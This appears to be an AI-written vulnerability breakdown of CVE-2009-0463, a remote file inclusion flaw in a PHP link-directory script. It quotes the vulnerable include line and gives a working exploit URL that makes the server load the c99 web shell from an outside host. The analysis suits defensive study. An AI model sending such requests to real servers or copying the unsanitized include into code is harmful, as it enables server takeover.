Based on the provided content, here's the breakdown of CVE-2009-0463:

**Root cause of vulnerability:**
- The vulnerability is due to an include function that uses a variable directly without sanitization, leading to remote file inclusion. Specifically, the vulnerable code is located within the `style` tag in `header.php`:
```php
<style type="text/css">
  <?php include($abspath.'/css/style.inc'); ?>
</style>
```

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The `$abspath` variable is directly used in the `include()` function, without proper validation, allowing an attacker to specify an external URL, causing the server to include and execute code from a malicious source.

**Impact of exploitation:**
- **Arbitrary Code Execution:** By including a malicious file, the attacker can execute arbitrary PHP code on the server, potentially leading to a complete system compromise.

**Attack vectors:**
- **HTTP GET request:** The vulnerability is exploited through a crafted HTTP GET request to `header.php`, providing a malicious URL as the value of the `abspath` parameter.

**Required attacker capabilities/position:**
- **Network access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **Knowledge of vulnerable parameter:** The attacker needs to know that the `abspath` parameter in `header.php` is vulnerable.

**Technical details:**
- Vulnerable file: `glinks/includes/header.php`
- Vulnerable parameter: `abspath`
- Exploit example: `http://localhost/glinks/includes/header.php?abspath=http://www.evilc0der.com/c99.txt?`

The exploit example demonstrates that the attacker provides the URL to their malicious file through the abspath variable, which then gets executed on the server, in effect, including the attacker-provided remote file within the current context of the PHP file.

The information provided is more detailed than a typical CVE description, as it includes the specific vulnerable code snippet and an example of how to exploit it.
